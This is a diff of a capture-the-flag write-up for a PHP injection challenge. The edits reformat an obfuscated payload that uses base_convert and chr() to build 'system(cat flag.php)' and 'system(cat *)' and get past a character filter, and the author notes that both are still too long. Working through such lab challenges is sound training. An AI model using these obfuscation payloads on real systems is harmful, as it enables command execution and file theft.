@@ -64,11 +64,11 @@ But, we *can* make `chr()`, which can take in an ASCII value and give us any cha
 
 ```php
 base_convert(1751504350,10,36). // system
-(base_convert(15941,10,36).    // (cat
+(base_convert(15941,10,36).     // (cat
 base_convert(16191,10,36)(32).  // chr(32)  /space
-base_convert(727432,10,36).    // flag    
-base_convert(16191,10,36)(46). // chr(46)  / period
-base_convert(33037,10,36))     // php)
+base_convert(727432,10,36).     // flag    
+base_convert(16191,10,36)(46).  // chr(46)  / period
+base_convert(33037,10,36))      // php)
 // => system(cat flag.php)
 ```
 
@@ -77,7 +77,13 @@ Great, just paste it in, and...
 ![](/images/phpc6.png)
 
 Too long. The payload has to be less than 93 characters. Well, we don't necessarily need get 
-*just* `flag.php`'s contents. How about `system(cat *)`, or `base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(42))`?
+*just* `flag.php`'s contents. How about `system(cat *)`, which is:
+```php
+base_convert(1751504350,10,36). // system
+(base_convert(15941,10,36).     // (cat
+base_convert(16191,10,36)(32).  // chr(32) = space
+base_convert(16191,10,36)(42))  // chr(42) = *
+```
 
 
 This is unfortunately still too long - 117 characters. So close!  This is where I really got stuck. 
